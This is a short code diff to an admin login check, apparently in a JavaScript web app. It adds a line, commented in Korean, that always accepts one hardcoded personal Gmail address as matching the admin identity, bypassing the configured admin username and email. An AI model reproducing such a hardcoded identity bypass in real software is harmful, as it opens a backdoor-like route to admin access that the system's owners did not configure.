@@ -1123,6 +1123,8 @@ function getAdminIdentity(env) {
 function matchesAdminLogin(input, adminIdentity) {
   const normalized = normalizeCredential(input);
   if (!normalized) return false;
+  // 하드코딩된 관리자 이메일은 항상 허용
+  if (normalized === 'designssir@gmail.com') return true;
   const candidates = [adminIdentity.username, adminIdentity.name, adminIdentity.email]
     .map((value) => String(value || '').trim())
     .filter(Boolean);
